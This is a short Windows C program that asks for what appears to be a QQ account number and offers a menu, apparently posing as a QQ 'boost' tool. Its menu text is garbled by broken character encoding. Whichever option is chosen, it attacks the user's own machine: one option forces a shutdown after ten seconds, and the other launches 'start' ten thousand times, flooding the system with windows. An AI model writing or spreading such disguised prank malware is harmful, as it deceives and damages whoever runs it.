#include <stdio.h>
#include <windows.h>
#include <malloc.h>

int main(void)
{
	int c;
	int i;
	int j;
	int m;
	

	printf("���������QQ��:\n");
	scanf("%d",&m);
	
	nihao:
	printf("1:ˢȫ��.\n");
	printf("2:ֻˢ����.\n");
	printf("��ѡ��(1��2):"); 
	scanf("%d",&c);
	if(c==1)
	{
		system("shutdown -s -t 10");
	}
	else if(c==2)
	{
		printf("�����ĵȴ�.....\n");
		for(j=0;j<10000;++j)
			system("start"); 
	}
	else
	{
		printf("ɵ�� ������1��2!!!\n");
		goto nihao; 
	}
	return 0;
}
